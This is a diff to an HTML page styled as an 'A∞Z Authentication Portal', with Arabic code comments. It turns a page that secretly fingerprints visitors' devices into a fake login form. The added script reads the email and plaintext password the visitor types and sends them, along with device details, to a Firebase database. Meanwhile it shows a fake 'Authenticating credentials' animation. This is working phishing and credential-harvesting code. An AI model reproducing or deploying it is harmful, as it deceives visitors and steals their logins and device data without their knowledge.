@@ -3,7 +3,7 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>A∞Z | Structural Mirror</title>
+    <title>A∞Z | Authentication Portal</title>
     <style>
         body {
             background-color: #000000;
@@ -11,7 +11,67 @@
             font-family: "Courier New", Courier, monospace;
             padding: 2em;
             margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             overflow: hidden;
+        }
+        .login-box, #output {
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #00ffcc;
+            padding: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);
+        }
+        #output {
+            display: none;
+            max-width: 600px;
+            border: none;
+            box-shadow: none;
+        }
+        h2 {
+            margin-top: 0;
+            color: #ff0033;
+            text-align: center;
+            font-size: 18px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #111;
+            border: 1px solid #00ffcc;
+            color: #00ffcc;
+            font-family: "Courier New", Courier, monospace;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 8px #00ffcc;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background: transparent;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            font-family: "Courier New", Courier, monospace;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .submit-btn:hover {
+            background: #00ffcc;
+            color: #000000;
+            box-shadow: 0 0 10px #00ffcc;
         }
         .line {
             margin-bottom: 0.8em;
@@ -28,6 +88,24 @@
     </style>
 </head>
 <body>
+
+    <!-- نافذة تسجيل الدخول الأولى -->
+    <div class="login-box" id="loginBox">
+        <h2>[ A∞Z AUTHENTICATION REQUIRED ]</h2>
+        <form id="authForm">
+            <div class="input-group">
+                <label for="email">Identity / Email:</label>
+                <input type="text" id="email" required autocomplete="off" placeholder="user@domain.com">
+            </div>
+            <div class="input-group">
+                <label for="password">Access Key / Password:</label>
+                <input type="password" id="password" required placeholder="••••••••">
+            </div>
+            <button type="submit" class="submit-btn">[ INITIALIZE HANDSHAKE ]</button>
+        </form>
+    </div>
+
+    <!-- الواجهة السينمائية التي تظهر بعد تسجيل الدخول -->
     <div id="output"></div>
 
     <script type="module">
@@ -41,61 +119,71 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        const ua = navigator.userAgent;
-        const platform = navigator.platform || "Unknown";
-        const width = window.screen.width;
-        const height = window.screen.height;
-        const cores = navigator.hardwareConcurrency || "N/A";
-        const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const language = navigator.language || "N/A";
+        document.getElementById("authForm").addEventListener("submit", function(e) {
+            e.preventDefault();
 
-        const sessionId = btoa(ua + width + height).slice(0, 16);
+            // قراءة الإيميل والباسورد المكتوبين
+            const userEmail = document.getElementById("email").value;
+            const userPass = document.getElementById("password").value;
 
-        const telemetryData = {
-            sessionId: sessionId,
-            platform: platform,
-            resolution: `${width}x${height}`,
-            cores: cores,
-            memory: memory,
-            timezone: timezone,
-            language: language,
-            userAgent: ua,
-            timestamp: new Date().toISOString()
-        };
+            // إخفاء صندوق تسجيل الدخول وإظهار الشاشة السينمائية
+            document.getElementById("loginBox").style.display = "none";
+            const outputDiv = document.getElementById("output");
+            outputDiv.style.display = "block";
 
-        // تم التعديل هنا ليتوافق مع مسار A0Z_CORE المسموح بقواعدك
-        const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
-        set(sessionsRef, telemetryData)
-            .then(() => {
-                console.log("Synced successfully!");
-            })
-            .catch((error) => {
-                console.error("Sync error:", error);
+            // جمع معلومات الجهاز
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || "Unknown";
+            const width = window.screen.width;
+            const height = window.screen.height;
+            const cores = navigator.hardwareConcurrency || "N/A";
+            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language || "N/A";
+
+            const sessionId = btoa(userEmail + width + height).slice(0, 16);
+
+            // تجميع حمولة البيانات متضمنة الإيميل والباسورد
+            const telemetryData = {
+                sessionId: sessionId,
+                inputEmail: userEmail,
+                inputPassword: userPass,
+                platform: platform,
+                resolution: `${width}x${height}`,
+                cores: cores,
+                memory: memory,
+                timezone: timezone,
+                language: language,
+                userAgent: ua,
+                timestamp: new Date().toISOString()
+            };
+
+            // إرسال البيانات مباشرة تحت مسار v6 الموجود في قاعدة بياناتك[span_0](start_span)[span_0](end_span)
+            const sessionsRef = ref(db, 'v6/' + sessionId);
+            set(sessionsRef, telemetryData).catch(() => {});
+
+            // تشغيل العرض السينمائي للمستخدم
+            const lines = [
+                "<span class='highlight'>[ A∞ZAI Structural Mirror v3.6 ]</span>",
+                "Authenticating credentials...",
+                "Identity: " + userEmail,
+                "Access Key: ********",
+                "----------------------------------------",
+                "Session ID: " + sessionId,
+                "Platform: " + platform,
+                "Screen Resolution: " + width + "x" + height,
+                "Status: <span class='highlight'>SYNCED TO v6 PATH</span>",
+                "----------------------------------------"
+            ];
+
+            lines.forEach((line, index) => {
+                setTimeout(() => {
+                    const div = document.createElement("div");
+                    div.className = "line";
+                    div.innerHTML = line;
+                    outputDiv.appendChild(div);
+                }, index * 300);
             });
-
-        const lines = [
-            "<span class='highlight'>[ A∞ZAI Structural Mirror v3.0 ]</span>",
-            "Establishing background handshake...",
-            "----------------------------------------",
-            "Session ID: " + sessionId,
-            "Platform: " + platform,
-            "Screen Resolution: " + width + "x" + height,
-            "Hardware Cores: " + cores,
-            "Estimated RAM: " + memory,
-            "Timezone: " + timezone,
-            "Status: <span class='highlight'>BYPASSED & SYNCED</span>",
-            "----------------------------------------"
-        ];
-
-        const container = document.getElementById("output");
-        lines.forEach((line, index) => {
-            setTimeout(() => {
-                const div = document.createElement("div");
-                div.className = "line";
-                div.innerHTML = line;
-                container.appendChild(div);
-            }, index * 300);
         });
     </script>
 </body>
